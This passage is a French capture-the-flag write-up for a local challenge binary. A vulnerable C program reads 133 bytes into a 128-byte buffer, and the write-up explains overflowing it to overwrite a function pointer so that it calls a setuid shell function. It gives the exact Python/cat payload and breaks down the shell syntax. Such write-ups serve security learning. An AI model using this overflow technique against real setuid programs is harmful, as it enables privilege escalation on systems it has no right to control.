on a:

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}

void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

On va ecrire 128 x "A" puis ecraser la valeur du pointeur sur fonction avec celle de la fonction shell

Pour cela on recupere l'adresse de la fonction

`
objdump -d ch15
`
<img width="807" height="453" alt="image" src="https://github.com/user-attachments/assets/1855b801-05f9-426c-b395-30766093c2be" />


08048516

### Solution

Donc ensuite on a juste a faire la commande :

`((python -c "print 'A'*128+'\x16\x85\x04\x08'") ; cat)  | ./ch15`

**Explication** 

On a trois idées à comprendre :

les parenthèses (...) → sous-shell

le ; → exécuter deux commandes à la suite

le | → envoyer la sortie d’un côté comme entrée de l’autre

`( ... ) | ./ch15`  tout ce que le bloc ( ... ) écrit sur sa sortie standard (stdout) est envoyé comme entrée standard (stdin) de ./ch15.

`( ( python ... ) ; cat )` les parantheses lancent un sous-shell et le ; fait `( commande1 ; commande2 )` donc on execute python puis cat

Le python -c ca execute le code python dans les guillemets

Au final: 

Python → envoie la payload

puis cat → garde le flux ouvert et continue à alimenter l’entrée

donc ton shell /bin/bash peut vivre et devenir interactif.

